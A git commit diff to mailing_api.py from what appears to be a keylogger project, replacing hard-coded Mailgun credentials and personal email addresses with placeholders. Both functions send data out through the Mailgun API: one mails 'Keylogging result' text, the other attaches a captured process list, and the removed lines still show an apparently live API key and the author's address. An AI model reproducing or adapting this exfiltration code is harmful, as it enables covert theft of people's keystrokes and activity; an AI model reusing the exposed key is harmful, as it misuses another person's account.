9802340dbf05bf63739f6d385494205ab15f44b5
Hwang TaeHo <hth225@gmail.com>
2017-04-29 12:07:31 +0900

    Update mailing_api.py

--- mailing_api.py
+++ mailing_api.py
@@ -2,21 +2,21 @@ import requests
 
 def send_simple_message(file_content):
     return requests.post(
-        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
-        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
-        data={"from": "HookerFromLaptop_1 <postmaster@mg.ladmail.com>",
-              "to": "lad <hth225@gmail.com>",
-              "subject": "Hello lad, Here is Keylogging result",
+        "https://api.mailgun.net/v3/[your mail gun url]/messages",
+        auth=("api", "[your api key]"),
+        data={"from": "[sender] <postmaster@[your mail gun url]>",
+              "to": "[receiver's name] <[receiver's email address]>",
+              "subject": "[subject]",
               "text":  file_content
               })
 
 def send_LOG():
     return requests.post(
-        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
-        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
+        "https://api.mailgun.net/v3/[your mail gun url]/messages",
+        auth=("api", "[your api key]"),
         files=[("attachment", open("Process_list.txt"))],
-        data={"from": "PSManagerFromLaptop_1 <postmaster@mg.ladmail.com>",
-              "to": "lad <hth225@gmail.com>",
-              "subject": "Hello lad, Here is captured Process Logfile",
+        data={"from": "PSManagerFromLaptop_1 <postmaster@[your mail gun url]>",
+              "to": "name <[receiver's name]>",
+              "subject": "Hello name, Here is captured Process Logfile",
               "text": "CAPTURED PROCESS LOGFILE you should view on google docs"
               })
